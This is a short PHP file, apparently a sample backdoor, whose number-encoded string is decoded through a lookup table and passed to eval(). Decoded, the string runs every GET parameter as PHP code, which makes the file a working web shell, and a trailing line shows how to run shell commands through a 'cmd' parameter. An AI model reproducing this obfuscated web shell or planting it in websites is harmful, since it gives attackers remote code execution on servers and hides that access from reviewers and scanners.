<?php
/**
 * @Author: Eka Syahwan
 * @Date:   2017-05-21 21:21:18
 * @Last Modified by:   Eka Syahwan
 * @Last Modified time: 2017-05-21 14:24:02
 */
error_reporting(0);
$fcKey = "4.17.17.14.17.63.17.4.15.14.17.19.8.13.6.66..67.69.59.5.14.17.4.0.2.7.59.66.61.63.32.30.45.59.0.18.59.61.10.4.24.59.55.77.59.61.21.0.11.20.4.67.59.53.59.4.21.0.11.66.61.21.0.11.20.4.67.69.54";
$r  = range("a", "z"); foreach (range("A", "Z") as $key => $palalu) { $r[] = $palalu;} $r[] = "!";$r[] = "{";$r[] = "}";$r[] = "=";$r[] = "[";$r[] = "'";$r[] = "]";$r[] = " ";$r[] = "@";$r[] = "$";$r[] = "%";$r[] = "_";$r[] = "&";$r[] = "|";$r[] = "(";$r[] = ")";$r[] = '"';$r[] = ';';$r[] = '=';$r[] = ':';$r[] = '/';$r[] = '.';$r[] = '\\';$r[] = '/';$r[] = '\/';$r[] = '>';
$keys = explode(".", $fcKey);
foreach ($keys as $key => $value) {
	$k .= "$r[$value]";
}
eval(base64_decode(base64_encode($k)));
?>
Pleas send request : ?cmd=echo shell_exec("dir"); for run sample backdoor with GET files
